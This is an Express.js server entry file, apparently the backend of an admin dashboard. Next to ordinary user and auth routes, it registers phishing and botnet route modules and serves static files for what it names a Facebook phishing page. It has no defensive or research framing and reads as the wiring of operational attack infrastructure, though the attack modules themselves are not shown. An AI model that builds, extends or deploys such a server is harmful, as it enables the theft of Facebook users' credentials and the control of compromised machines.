/*
 * Filename: d:\Project\vue-material-admin\app.js
 * Path: d:\Project\vue-material-admin
 * Created Date: Saturday, April 6th 2019, 5:35:08 pm
 * Author: trung
 *
 * Copyright (c) 2019 Your Company
 */

var express = require("express");
var path = require("path");
var favicon = require("serve-favicon");
var logger = require("morgan");
var bodyParser = require("body-parser");
var cookieParser = require("cookie-parser");
//#region global
global.tokenList = [];
global.DEBUG = true;
global.log = function log(state, log) {
  if (!global.DEBUG) {
    if (state == "DEBUG" || state == "ERR") {
      return;
    }
  }
  console.log(
    "[" +
      __filename.slice(__dirname.length + 1) +
      "] - " +
      "[" +
      new Date().toLocaleString() +
      "] - [" +
      state +
      "]: " +
      log
  );
};
//#endregion
//import models
const { User } = require("./src/backend/db_orm");

// import routes

//#region portal
//var login = require("./src/backend/route/loginRoute");
var auth = require("./src/backend/routes/auth");
var user = require("./src/backend/routes/user");
var users = require("./src/backend/routes/users");
//#endregion

//#region cdn
var dbUtil = require("./src/backend/services/DbUtilities");
var phishingRoute = require("./src/backend/routes/PhishingRoute");
var AuthRoutes = require("./src/backend/routes/AuthRoute"); //importing route
var BotnetRoutes = require("./src/backend/routes/BotnetRoute"); //importing route
dbUtil.init();
//#endregion

//config server
var app = express();
app.use(logger("dev"));
app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: "false" }));
app.use(express.static(path.join(__dirname, "dist")));
app.set("view engine", "html");

// config routes to server
//#region portal
app.use("/api/v1", auth);
app.use("/api/v1/user", user);
app.use("/api/v1/users", users);
//#endregion
//#region cdn
phishingRoute(app);
BotnetRoutes(app);
AuthRoutes(app); //register the route
app.use(
  "/fbPhising_files",
  express.static("./src/backend/views/pages/fbphishing/fbPhising_files")
);
//#endregion

//location for session

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  var err = new Error("Not Found");
  err.status = 404;
  next(err);
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get("env") === "development" ? err : {};

  // render the error page
  res.status(err.status || 500);
  //return 500;
  //res.render("error");
  res.json({ status: "error", message: err.message, code: err.status || 500 });
});

module.exports = app;
